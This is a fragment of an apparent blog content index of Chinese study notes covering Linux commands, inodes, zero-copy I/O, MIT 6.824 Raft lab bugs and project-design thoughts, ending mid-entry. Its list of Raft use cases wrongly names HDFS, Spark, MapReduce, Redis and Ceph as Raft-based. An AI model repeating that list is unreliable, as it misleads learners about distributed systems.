<td>grep -v ‘<sup>#|</sup>$’ filename</td>
<td>^#：以#开头，去掉空行和以#开头的行</td>
</tr>
</tbody>
</table>
<h2 id="2-2-tar">2.2 tar</h2>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">压缩命令</span><br><span class="line">tar：该命令用于将多个文件或目录打包成一个文件，也可以同时对其进行压缩。常用的参数有：</span><br><span class="line"><span class="deletion">-c：创建新的压缩文件。</span></span><br><span class="line"><span class="deletion">-v：显示详细的压缩过程。</span></span><br><span class="line"><span class="deletion">-f：指定压缩文件的名称。</span></span><br><span class="line"><span class="deletion">-z：使用gzip压缩算法进行压缩。</span></span><br><span class="line"><span class="deletion">-j：使用bzip2压缩算法进行压缩。</span></span><br><span class="line"><span class="deletion">-J：使用xz压缩算法进行压缩。</span></span><br><span class="line"></span><br><span class="line">解压命令：</span><br><span class="line">tar：该命令不仅可以用于压缩，也可以用于解压。解压时常用的参数有：</span><br><span class="line"><span class="deletion">-x：从压缩文件中提取文件或目录。</span></span><br><span class="line"><span class="deletion">-v：显示详细的解压过程。</span></span><br><span class="line"><span class="deletion">-f：指定要解压的压缩文件名称。</span></span><br><span class="line"><span class="deletion">-z：解压使用gzip压缩算法的文件。</span></span><br><span class="line"><span class="deletion">-j：解压使用bzip2压缩算法的文件。</span></span><br><span class="line"><span class="deletion">-J：解压使用xz压缩算法的文件。</span></span><br><span class="line">例如，要解压doc.tar.gz到当前目录，可以使用命令tar -xzvf doc.tar.gz。</span><br></pre></td></tr></table></figure>
<h2 id="2-3-top">2.3 top</h2>
<p>top命令是Linux下常用的性能分析工具，能够实时显示系统中各个进程的资源占用状况</p>
<h2 id="2-4-ps">2.4 ps</h2>
<p>ps命令用于报告当前系统的进程状态。ps命令是最基本同时也是非常强大的进程查看命令，使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等，总之大部分信息都是可以通过执行该命令得到的。</p>
<h2 id="2-5-free">2.5 free</h2>
<p>free命令可以显示当前系统未使用的和已使用的内存数目，还可以显示被内核使用的内存缓冲区。</p>
<p><a href="https://www.jianshu.com/p/4bca8fe8a878">面试官常考的 21 条 Linux 命令 - 简书 (jianshu.com)</a></p>
<h1>3 文件系统</h1>
<h2 id="3-1-Linux相关：文件的概念？文件有哪些类型？各自的作用是什么？">3.1 Linux相关：文件的概念？文件有哪些类型？各自的作用是什么？</h2>
<p><strong>解析：</strong>： 文件类型很多，能回答几种常见的就行，例如普通文件，目录文件，块设备文件，套接字文件。 <strong>参考回答：</strong></p>
<blockquote>
<p>1.普通文件（-）：这是最常见的文件类型，包括纯文本文件、二进制文件、数据文件等。它们不包含文件系统的结构信息，只是用户所接触到的文件。例如，.c文件、可执行的二进制文件等都是普通文件。</p>
<p>2.目录文件（d）：目录文件是用于存放文件名及其相关信息的文件。它们可以包含下一级文件目录或普通文件，是内核组织文件系统的基本节点。通过目录文件，用户可以轻松地浏览和管理文件系统。</p>
<p>3.字符设备文件（c）：这类文件提供了对设备不带缓冲区的访问，每次访问长度可变。它们通常用于表示系统中的字符设备，如控制台、串口等。</p>
<p>4.块设备文件（b）：块设备文件提供对设备（如磁盘）带缓冲的访问，每次访问以固定的长度单位进行。它们用于表示系统中的块设备，如硬盘、U盘等。</p>
<p>5.FIFO（p）：FIFO文件也称为命名管道，用于进程间的通信。它们允许一个进程向另一个进程发送数据，而不需要通过中间的文件或网络连接。</p>
<p>6.套接字（s）：套接字文件用于进程间的网络通信。它们提供了一种在不同进程之间传输数据的方式，通常用于实现网络服务和客户端之间的通信。</p>
<p>7.链接文件（l）：链接文件是指向另一个文件的指针。它们可以分为硬链接和符号链接两种。硬链接指向文件的inode节点，而符号链接则指向另一个文件的路径名。通过链接文件，用户可以方便地访问其他文件或目录。</p>
<p>除了以上七种常见的文件类型外，Linux系统中还有其他一些特殊的文件类型，如特殊文件、门文件等，但这些类型在日常使用中相对较少见。</p>
</blockquote>
<p><strong>学习指引：</strong> <a href="https://gw-c.nowcoder.com/api/sparta/jump/link?link=https%3A%2F%2Fxiaolincoding.com%2Fos%2F6_file_system%2Ffile_system.html%23%25E6%2596%2587%25E4%25BB%25B6%25E7%25B3%25BB%25E7%25BB%259F%25E7%259A%2584%25E5%259F%25BA%25E6%259C%25AC%25E7%25BB%2584%25E6%2588%2590">推荐学习：小林 coding|图解系统｜文件系统</a></p>
<h2 id="3-2-Linux相关：inode的作用？inode包含哪些内容？给出一个文件名，Linux是如何根据该文件名打开文件的？（文件名-inode-block）文件的访问时间是如何记录的？">3.2 Linux相关：inode的作用？inode包含哪些内容？给出一个文件名，Linux是如何根据该文件名打开文件的？（文件名-&gt;inode-&gt;block）文件的访问时间是如何记录的？</h2>
<p><strong>解析：</strong>： 考察linux文件系统相关问题，比较细，推荐大家系统学习后理解掌握 <strong>参考回答：</strong></p>
<blockquote>
<p><strong>1.inode的作用？：</strong> inode，即索引节点，在Linux文件系统中用于存储文件或目录的元数据信息。它是文件系统的一个基本组成部分，允许系统通过inode号而非完整的文件路径快速访问到文件数据。</p>
<p><strong>2.inode包含哪些内容？：</strong> inode包含文件的元数据信息，如文件大小、文件所有者、文件权限、文件类型、文件的创建/访问/修改时间等。此外，inode还包含指向文件数据块的指针，这些指针指示了文件内容在磁盘上的实际存储位置。</p>
<p><mark><strong>3.给出一个文件名，Linux是如何根据该文件名打开文件的？</strong> <strong>（文件名-&gt;inode-&gt;block）</strong></mark>： 当给出一个文件名时，Linux首先会根据文件路径在目录结构中查找该文件对应的<mark>目录项</mark>。目录项中包含了文件的inode号。然后，系统会使用这个inode号在文件系统中找到对应的inode结构。一旦找到inode，系统就可以通过inode中的指针找到文件数据所在的磁盘块（block）。最后，系统将这些磁盘块加载到内存中，从而打开并访问文件。</p>
<p><strong>4.文件的访问时间是如何记录的</strong>？： 文件的访问时间是通过inode中的访问时间戳（atime）来记录的。每当文件被读取时，其inode中的atime就会被更新为当前时间。这个机制允许系统跟踪文件的访问历史，以便进行各种管理和维护操作。需要注意的是，为了优化性能，某些文件系统可能会延迟更新atime或仅在文件内容实际被读取时更新它。</p>
</blockquote>
<p><a href="https://www.nowcoder.com/discuss/590576768491216896?sourceSSR=users">阿里云 实习面经（已OC） 一面面经｜讲解_牛客网 (nowcoder.com)</a></p>
<h2 id="3-3-零拷贝是什么？用来解决什么问题？有哪些应用场景？实现方式有哪些？">3.3 零拷贝是什么？用来解决什么问题？有哪些应用场景？实现方式有哪些？</h2>
<p><strong>解析：</strong>：</p>
<p><strong>参考回答：</strong></p>
<blockquote>
<p><strong>1.是什么？</strong>：零拷贝是一种IO操作优化技术，旨在减少数据在内核空间和用户空间之间的冗余拷贝，从而解放CPU、减少上下文切换并降低系统资源消耗。它主要用来解决传统IO操作中不必要的数据拷贝问题，提高数据传输效率。</p>
<p><strong>2.应用场景</strong>：零拷贝技术广泛应用于需要高性能数据传输的场景，如网络传输、文件传输、数据库操作等。在这些场景中，大量的数据需要在内核空间和用户空间之间传输，传统的IO操作会导致不必要的数据拷贝和性能损失。</p>
<p><strong>3.实现方式有哪些？</strong>：实现零拷贝的方式主要有mmap、sendfile、splice和tee等。其中，mmap通过内存映射将内核缓冲区与用户空间共享，避免了数据拷贝；sendfile直接将数据从内核缓冲区发送到网络缓冲区，减少了CPU拷贝；splice和tee则在内核空间内实现数据的传输和复制，避免了用户空间的参与。这些技术根据具体的应用场景和需求选择使用，可以有效地提高数据传输效率和系统性能。</p>
</blockquote>
<p><strong>学习指引：</strong> <a href="https://gw-c.nowcoder.com/api/sparta/jump/link?link=https%3A%2F%2Fxiaolincoding.com%2Fos%2F8_network_system%2Fzero_copy.html">图解系统：什么是零拷贝？如何实现零拷贝？</a></p>
]]></content>
  </entry>
  <entry>
    <title>零拷贝</title>
    <url>/2024/06/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E9%9B%B6%E6%8B%B7%E8%B4%9D/</url>
    <content><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202408181602083.png" alt="未命名绘图.png"></p>
<h1>1 传统IO方式</h1>
<p>传统的 IO 读写其实就是 read + write 的操作，整个过程会分为如下几步</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>用户调用 read()方法，开始读取数据，此时发生一次上下文从用户态到内核态的切换，也就是图示的切换 1</p>
</li>
<li class="lvl-2">
<p>将磁盘数据通过 DMA 拷贝到内核缓存区</p>
</li>
<li class="lvl-2">
<p>将内核缓存区的数据拷贝到用户缓冲区，这样用户，也就是我们写的代码就能拿到文件的数据</p>
</li>
<li class="lvl-2">
<p>read()方法返回，此时就会从内核态切换到用户态，也就是图示的切换 2</p>
</li>
<li class="lvl-2">
<p>当我们拿到数据之后，就可以调用 write()方法，此时上下文会从用户态切换到内核态，即图示切换 3</p>
</li>
<li class="lvl-2">
<p>CPU 将用户缓冲区的数据拷贝到 Socket 缓冲区</p>
</li>
<li class="lvl-2">
<p>将 Socket 缓冲区数据拷贝至网卡</p>
</li>
<li class="lvl-2">
<p>write()方法返回，上下文重新从内核态切换到用户态，即图示切换 4</p>
</li>
</ul>
<h1>2 零拷贝技术</h1>
<blockquote>
<p>基于零拷贝技术，可以减少 CPU 的拷贝次数和上下文切换次数，从而可以实现文件高效的读写操作。</p>
</blockquote>
<h2 id="2-1-mmap">2.1 mmap</h2>
<blockquote>
<p>将一个文件映射到进程的地址空间，省掉了数据在内核缓冲区和用户缓冲区之间的CPU拷贝环节</p>
</blockquote>
<p>mmap（memory map）是一种内存映射文件的方法，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。</p>
<p>简单地说就是内核缓冲区和应用缓冲区共享，从而减少了从读缓冲区到用户缓冲区的一次 CPU 拷贝。</p>
<p>基于 mmap IO 读写其实就变成 mmap + write 的操作，也就是用 mmap 替代传统 IO 中的 read 操作。</p>
<p>当用户发起 mmap 调用的时候会发生上下文切换 1，进行内存映射，然后数据被拷贝到内核缓冲区，mmap 返回，发生上下文切换 2；随后用户调用 write，发生上下文切换 3，将内核缓冲区的数据拷贝到 Socket 缓冲区，write 返回，发生上下文切换 4。</p>
<h2 id="2-2-sendfile">2.2 sendfile</h2>
<p>sendfile()跟 mmap()一样，也会减少一次 CPU 拷贝，但是它同时也会减少两次上下文切换。</p>
<p>用户在发起 sendfile()调用时会发生切换 1，之后数据通过 DMA 拷贝到内核缓冲区，之后再将内核缓冲区的数据 CPU 拷贝到 Socket 缓冲区，最后拷贝到网卡，sendfile()返回，发生切换 2。发生了 3 次拷贝和两次切换。</p>
<p>sendfile并没有文件的读写操作，而是直接将文件的数据传输到 target 目标缓冲区，也就是说，sendfile 是无法知道文件的具体的数据的；但是 mmap 不一样，他是可以修改内核缓冲区的数据的。假设如果需要对文件的内容进行修改之后再传输，只有 mmap 可以满足。</p>
<h1>3 参考</h1>
<p><a href="https://mp.weixin.qq.com/s/fRyVilpB4iLftX_BOKWR-Q">一张图带你看懂 IO 零拷贝技术！ (qq.com)</a></p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>零拷贝</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/01/18/%E9%A1%B9%E7%9B%AE/MIT6.824%20Lab1%20MapReduce/</url>
    <content><![CDATA[<p>rpc: gob error encoding body: gob: type mr.JobConfirm has no exported fields</p>
<p>rpc.go中的定义struct中变量要大写</p>
]]></content>
  </entry>
  <entry>
    <title>MIT6.824 Lab3 KVraft</title>
    <url>/2024/02/22/%E9%A1%B9%E7%9B%AE/MIT6.824%20Lab3%20KVraft/</url>
    <content><![CDATA[<h1>Bug</h1>
<h3 id="1-panic-close-of-closed-channel">1. <code>panic: close of closed channel</code></h3>
<p>在server中，只使用了一个全局的管道来接收命令应用结果，PutAppend和Get共享一个管道，两个分别打开管道，随后一个关闭，另一个在关闭时出现问题</p>
<ul class="lvl-0">
<li class="lvl-2">给两个操作加锁，只有操作执行完（成功执行，超时）才解锁</li>
<li class="lvl-2">对Start返回的index，每一个添加一个管道</li>
</ul>
<h2 id="2-command被复制到半数以上服务器，但是还没有在状态机上执行，然后选举出新的leader，新的leader具有添加的命令">2. command被复制到半数以上服务器，但是还没有在状态机上执行，然后选举出新的leader，新的leader具有添加的命令</h2>
<p>在Lab2就想到的问题，一直考虑已经被添加的command如何被再次添加，发现在raft层无法解决这个问题。</p>
<p>在Lab3中遇到了此问题，考虑在server中记录client已经添加的命令（命令可能未执行成功），在收到更小的command时，则不调用Start添加到leader。这需要启用新的server作为leader时，快速将已有的命令执行完毕（在添加任何新命令之前），这一步难以实现。</p>
<p>因此考虑在command中添加client的命令标志，重传的命令也可以被添加到log中，但是在执行时会发现该命令已经执行过</p>
<p>命令没有被执行 TestManyPartitionsManyClients3A</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="section">=== RUN   TestManyPartitionsManyClients3A</span></span><br><span class="line">Test: partitions, many clients (3A) ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>命令结果有额外部分（多执行了？）TestConcurrent3A</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Test: </span>unreliable net, restarts, partitions, random keys, many clients (3A) ...</span><br><span class="line">info: wrote history visualization to /tmp/1021001197.html</span><br><span class="line">    test_test.go:382: history is not linearizable</span><br><span class="line">--- FAIL: TestPersistPartitionUnreliableLinearizable3A (30.13s)</span><br></pre></td></tr></table></figure>
<h2 id="3-并发读写map">3. 并发读写map</h2>
<p><code>fatal error: concurrent map read and map write</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">replyCh := <span class="built_in">make</span>(<span class="keyword">chan</span> ApplierResult, <span class="number">1</span>)</span><br><span class="line">kv.appliedCh[index] = replyCh</span><br><span class="line"><span class="comment">//kv.appliedCh[index] = make(chan ApplierResult, 1)</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/02/01/%E9%A1%B9%E7%9B%AE/MIT6.824%20Lab2%20Raft/</url>
    <content><![CDATA[<p>term(任期)</p>
<p>Leader发出heartbeat(AppendEntries RPC不带有log entries)</p>
<blockquote>
<p>Raft is a consensus algorithm that is designed to be easy to understand. It’s equivalent to Paxos in fault-tolerance and performance.</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202402052155568.jpg" alt="QQ图片20240205215524.jpg"></p>
<h1>1 2A Leader election(领导人选举)</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>网络延迟、分区、包丢失、复制和重新排序。</p>
</li>
</ul>
<blockquote>
<p>This election term will continue until a follower stops receiving heartbeats and becomes a candidate.</p>
</blockquote>
<p>导致Follower进行选举的原因</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>网络延迟或者包丢失没有在选举超时前收到心跳</p>
</li>
<li class="lvl-2">
<p>网络分区而导致收不到心跳（disconnect）</p>
</li>
<li class="lvl-2">
<p>Leader宕机、崩溃（crash）</p>
</li>
</ul>
<h2 id="1-1-节点类型">1.1 节点类型</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>Leader</code>：负责发起心跳，响应客户端，创建日志，同步日志。</p>
</li>
<li class="lvl-2">
<p><code>Candidate</code>：Leader 选举过程中的临时角色，由 Follower 转化而来，发起投票参与竞选。</p>
</li>
<li class="lvl-2">
<p><code>Follower</code>：接受 Leader 的心跳和日志同步数据，投票给 Candidate。态转换</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202402031102578.png" alt="image-20240203110252535"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Follower$\rightarrow$Candidate（超时：一段时间内未收到heartbeat）</p>
</li>
</ul>
<p>Leader(AppendEntries RPC)</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>term过时：</p>
<ul class="lvl-2">
<li class="lvl-6">发送心跳发现Server的term号大于自身的term号（已经选出新的Leader，将自己状态变为Follower）</li>
<li class="lvl-6">收到RequestVote发现更高term号</li>
</ul>
</li>
</ul>
<p>Candidate(RequestVote RPC)</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>term过时</p>
<ul class="lvl-2">
<li class="lvl-6">收到新的Leader的心跳，请求投票时发现大于自身的term号</li>
<li class="lvl-6">收到RequestVote RPC的response，返回的term号更大</li>
</ul>
</li>
</ul>
<p>Follower：被动的，对来自Leader和Candidate的请求进行相应</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>收到Leader的心跳，且term号大于自身term号（更新自身term号）</p>
</li>
<li class="lvl-2">
<p>收到Candidate请求</p>
</li>
</ul>
<p>Server：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>拒绝过时term的请求</p>
</li>
</ul>
<h2 id="1-2-选举超时时间和心跳时间">1.2 选举超时时间和心跳时间</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>心跳间隔时间(heartbeat timeout)：Leader 会向所有的 Follower 周期性发送心跳来保证自己的 Leader 地位。</p>
</li>
<li class="lvl-2">
<p>选举超时时间(election timeout)：如果一个 Follower 在一个周期内没有收到心跳信息或者请求投票信息，就叫做选举超时，并开始一次新的选举。</p>
</li>
</ul>
<p>这两个时间需要保持一定的关系，网络无故障时，在选举超时前应该收到心跳，以保持Leader不变。选举超时时间至少需要大于AppendEntries RPC发送到server所需的最长时间。</p>
<h3 id="1-2-1-选举超时时间更新">1.2.1 选举超时时间更新</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>candidate成为leader</p>
</li>
<li class="lvl-2">
<p>candidate收到RequestVote response并变为follower</p>
</li>
<li class="lvl-2">
<p>server收到AppendEntries</p>
</li>
<li class="lvl-2">
<p>server收到RequestVote</p>
</li>
<li class="lvl-2">
<p>leader收到AppendEntries response发现更高term号</p>
</li>
</ul>
<h3 id="1-2-2-超时选举实现">1.2.2 超时选举实现</h3>
<p>在raft结构体中定义laskAcktime，在收到leader的heartbeat或者candidate的投票请求时，要更新选举超时时间这里没有通过定时器在到达选举超时时间后触发选举操作，而是首先记录下当前时间，然后让ticker协程sleep一段时间。当再次唤醒后，如果laskAcktime在startTime之后，说明在选举超时前收到了相关信号。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202402272153075.png" alt="image.png"></p>
<h2 id="1-3-注意点">1.3 注意点</h2>
<h3 id="1-3-1-sendAppendEntries没有启用新的协程">1.3.1 <code>sendAppendEntries</code>没有启用新的协程</h3>
<p>在<code>sendHeartbeat</code>中，异步发送<code>sendAppendEntries</code>，向所有server发送heartbeat，无需等待RPC完成。因为leader可能无法与其他server通信，或者server不可达，由于等待rpc返回，造成超时重新选举</p>
<p>异步发送<code>RequestVote</code>，并且收到超过半数选票后就成为Leader，发送心跳</p>
<p><code> go test -race -run 2A</code></p>
<h1>2 2B Log replication(日志复制)</h1>
<blockquote>
<p><mark><strong>Leader Completeness</strong></mark>: if a log entry is committed in a given term, then that entry will be present in the logs of the leaders for all higher-numbered terms. §5.4<br>
<mark><strong>State Machine Safety</strong></mark>: if a server has applied a log entry at a given index to its state machine, no other server will ever apply a different log entry for the same index. §5.4.3</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>leader收到client请求，将entry添加到log</p>
</li>
<li class="lvl-2">
<p>leader将添加的entry复制到其他server</p>
</li>
<li class="lvl-2">
<p>如果大多数server成功复制entry，则该entry已经committed</p>
</li>
<li class="lvl-2">
</li>
<li class="lvl-2">
<p>已经committed的entry需要应用到机器上，lastApplied代表已经执行的命令</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202402061214812.png" alt="Raft-第 1 页.png"></p>
<h2 id="2-1-Election-restriction-5-4-1">2.1 Election restriction(5.4.1)</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202402041429181.png" alt="Raft-第 2 页.png"></p>
<p>log backtracking</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202402061305538.png" alt="Raft-加速log回溯"></p>
<p>S1首先成为leader，成功发送了第一个entry</p>
<p>S1和S2与其他服务器断开后重连</p>
<h2 id="2-2-注意点">2.2 注意点</h2>
<blockquote>
<p>遇到的bug</p>
</blockquote>
<p>s1断联，添加了一系列entry</p>
<p>重连后，新的leader通过heartbeat更新了s1的commitindex，而此时s1的log还未更新</p>
<h1>3 2C</h1>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">persist</span><br><span class="line"><span class="comment">// Your code here (2C).</span></span><br><span class="line"><span class="comment">// Example:</span></span><br><span class="line"><span class="comment">// w := new(bytes.Buffer)</span></span><br><span class="line"><span class="comment">// e := labgob.NewEncoder(w)</span></span><br><span class="line"><span class="comment">// e.Encode(rf.xxx)</span></span><br><span class="line"><span class="comment">// e.Encode(rf.yyy)</span></span><br><span class="line"><span class="comment">// data := w.Bytes()</span></span><br><span class="line"><span class="comment">// rf.persister.SaveRaftState(data)</span></span><br><span class="line">readPersist</span><br><span class="line"><span class="comment">// Your code here (2C).</span></span><br><span class="line"><span class="comment">// Example:</span></span><br><span class="line"><span class="comment">// r := bytes.NewBuffer(data)</span></span><br><span class="line"><span class="comment">// d := labgob.NewDecoder(r)</span></span><br><span class="line"><span class="comment">// var xxx</span></span><br><span class="line"><span class="comment">// var yyy</span></span><br><span class="line"><span class="comment">// if d.Decode(&amp;xxx) != nil ||</span></span><br><span class="line"><span class="comment">//    d.Decode(&amp;yyy) != nil &#123;</span></span><br><span class="line"><span class="comment">//   error...</span></span><br><span class="line"><span class="comment">// &#125; else &#123;</span></span><br><span class="line"><span class="comment">//   rf.xxx = xxx</span></span><br><span class="line"><span class="comment">//   rf.yyy = yyy</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="3-1-Bug">3.1 Bug</h2>
<p>同一任期选出两个leader</p>
<p>乱序收到RPC response</p>
<p>AppendEntries的RPC response与当前term不一致</p>
<p>在变成follower时都重置了election time</p>
<h1>4 2D</h1>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202402151207733.png" alt="image-20240215120732611"></p>
<h2 id="4-1-bug">4.1 bug</h2>
<ol>
<li class="lvl-3">
<p>每10条command创建一个快照，快照会调用rf.mu这个互斥锁，当存在新的提交命令时，通过applyCh管道进行发送，而测试程序调用snapshot需要获取互斥锁，无法读取管道中的数据，则会产生死锁</p>
</li>
<li class="lvl-3">
<p><code>apply error: server 2 apply out of order, expected index 10, got 18</code></p>
<p>当snapshot存在未commit的命令时，snapshot和log分别放入applyCh，应当一次性放入applyCh</p>
</li>
<li class="lvl-3">
</li>
</ol>
<table>
<thead>
<tr>
<th>result</th>
<th>the time that the test took in seconds</th>
<th>the number of Raft peers</th>
<th>the number of RPCs sent during the test</th>
<th>the total number of bytes in the RPC messages</th>
<th>the number of log entries that Raft reports were committed</th>
</tr>
</thead>
<tbody>
<tr>
<td>PASSED</td>
<td>3.9</td>
<td>3</td>
<td>490</td>
<td>154736</td>
<td>207</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h1>5 问题</h1>
<h2 id="5-1-raft">5.1 raft</h2>
<p>raft是分布式一致性算法，基于复制状态机的思想，对于初始状态一样的节点，在他们上运行同样的命令，还会保持一致性的状态。raft主要包括领导者选举、日志复制、持久化以及快照等。</p>
<h2 id="5-2-raft应用场景">5.2 raft应用场景</h2>
<p>Raft 是一种共识算法，通常用于构建分布式系统中的可靠复制日志。它可以应用于各种分布式系统的场景，包括但不限于：</p>
<ol>
<li class="lvl-3">
<p><strong>分布式数据库系统</strong>：Raft 可以用于构建分布式数据库系统，确保数据的一致性和可靠性，比如 etcd、Consul 等。</p>
</li>
<li class="lvl-3">
<p><strong>分布式文件系统</strong>：在分布式文件系统中，Raft 可以确保各个节点之间的文件操作的一致性，比如 HDFS、Ceph 等。</p>
</li>
<li class="lvl-3">
<p><strong>分布式消息队列</strong>：Raft 可以确保消息队列中的消息传递和处理的一致性，比如 Kafka 等。</p>
</li>
<li class="lvl-3">
<p><strong>分布式计算</strong>：在分布式计算中，Raft 可以确保各个节点之间的任务调度和执行的一致性，比如 Spark、MapReduce 等。</p>
</li>
<li class="lvl-3">
<p><strong>分布式存储系统</strong>：Raft 可以确保分布式存储系统中数据的可靠性和一致性，比如分布式缓存系统如 Redis、分布式块存储系统如 Ceph 等。</p>
</li>
</ol>
<p>总的来说，任何需要在分布式环境中保证一致性和可靠性的系统都可以考虑使用 Raft 算法来实现。</p>
<h1>6 参考</h1>
<p><a href="https://raft.github.io/">Raft Consensus Algorithm 官网介绍</a></p>
<p><a href="http://thesecretlivesofdata.com/raft/">Raft (thesecretlivesofdata.com)</a>（Raft图示）</p>
<p><a href="https://raw.githubusercontent.com/ongardie/dissertation/master/book.pdf">Raft作者博士论文</a></p>
<p><a href="https://link.zhihu.com/?target=https%3A//thesquareplanet.com/blog/instructors-guide-to-raft/">Instructors’ Guide to Raft</a>[4]</p>
<p><a href="https://link.zhihu.com/?target=https%3A//thesquareplanet.com/blog/students-guide-to-raft/">Students’ Guide to Raft</a>[5]</p>
<p><a href="https://link.zhihu.com/?target=https%3A//thesquareplanet.com/blog/raft-qa/">Raft Q&amp;A</a>[6]</p>
<p>paxos 2015版的lab</p>
<p><a href="https://github.com/hashicorp/raft">hashicorp/raft: Golang implementation of the Raft consensus protocol (github.com)</a></p>
<p><a href="https://www.zhihu.com/question/29597104">如何的才能更好地学习 MIT6.824 分布式系统课程？ - 知乎 (zhihu.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/06/05/%E9%A1%B9%E7%9B%AE/%E9%A1%B9%E7%9B%AE%E8%BF%9B%E5%BA%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h1>1 项目难点</h1>
<p>对于业务场景项目，很多人自嘲增产改查。在具体去实现的时候，发现确实有些如此，但是这都是在项目成熟之后。难点在于从需求中最初对于整个项目结构、架构等的设计，从需求中分析出核心功能，在确定了核心功能，围绕功能的具体逻辑实现反而简单许多</p>
<h2 id="1-1-快照，每一天的活动状态可追溯">1.1 快照，每一天的活动状态可追溯</h2>
<p>方案一：每一天通过定时任务记录所有项目的状态快照点+状态变更（涉及到延期申请等，无法依据数据库的实际结束时间进行判断）</p>
<h2 id="1-2-多条件查询">1.2 多条件查询</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>动态SQL语句</p>
</li>
<li class="lvl-2">
<p>定义查询条件参数，过滤后封装传递给SQL语句</p>
</li>
<li class="lvl-2">
<p>Mybatis-plus插件</p>
</li>
</ul>
<p>某一条件设置查询条件某一条件未设置查询条件</p>
<h2 id="1-3-统计显示">1.3 统计显示</h2>
<p>考核日前查当月统计结果是当前查，考核日后查当月统计结果是快照查，考核日后的状态变更与当月无关，记录到下一个月中当前项目状态统计历史归档状态统计</p>
<p>跨考核日节点的统计</p>
<h1>2 领域</h1>
<p>项目上报、项目审批、项目状态变更、延期申请、延期审批、项目进度展示、数据统计用户权限配置、项目填报、项目审核、延期申请、延期审核、项目展示、统计界面</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/10/07/%E9%A1%B9%E7%9B%AE/%E5%AE%9E%E4%B9%A0/</url>
    <content><![CDATA[<h1>1 智能素材生成</h1>
<blockquote>
<p>[!question]<br>
需求的价值开始讲，然后分析问题再给出解决方案</p>
</blockquote>
<p>解决了什么问题，怎么解决的，难点，思考点是啥（方案选型）、其他方案对比</p>
<p>广告投放包括素材，定向和出价</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>素材用来表达和展示商品，吸引目标用户</p>
</li>
<li class="lvl-2">
<p>定向：广告投放给哪些人</p>
</li>
</ul>
<p>代理制作素材流程长（多次审核-&gt;法规、隐私数据）、缺乏与商品之间的关联、制作效率低</p>
<p>在媒体看到感兴趣的广告时，有这样的经历，看到的广告商品点击进入应用后，有时候很难找到那个商品，这便是承接要做的事情。</p>
<p>新老流程对比素材用来展示商品</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>代理制作素材流程长</p>
</li>
</ul>
<p>使用了什么方案，解决了什么问题</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>生成素材质量和准确性：代理制作素材采用通投文案和通用模板</p>
</li>
</ul>
<p>素材质量好坏评估指标：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>点击率</p>
</li>
<li class="lvl-2">
<p>转换成本</p>
</li>
<li class="lvl-2">
<p>拉新成功率</p>
</li>
</ul>
<p>描述项目的技术挑战和你是如何解决的</p>
<p>异步提交素材生产任务，调用素材生成服务可能失败</p>
<blockquote>
<p>[!question] 消息队列解决什么场景</p>
</blockquote>
<p>提交素材生产任务后，拿到素材生成任务ID，异步进行素材生产。作为消费方，通过消息队列监听素材生产状态，根据素材生成任务ID更新素材状态</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>消息重复</p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/07/11/%E7%AE%97%E6%B3%95/%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7%EF%BC%9A%E6%95%B0%E5%80%BC%E8%8C%83%E5%9B%B4/</url>
    <content><![CDATA[<blockquote>
<ul class="lvl-1">
<li class="lvl-2">
<p>最值</p>
</li>
<li class="lvl-3">
<p>二分查找（解的值域范围具有单调性，小于x的值范围都符合，大于x的值范围都不符合）</p>
</li>
<li class="lvl-3">
<p>动态规划</p>
</li>
<li class="lvl-2">
<p>二分查找</p>
</li>
<li class="lvl-3">
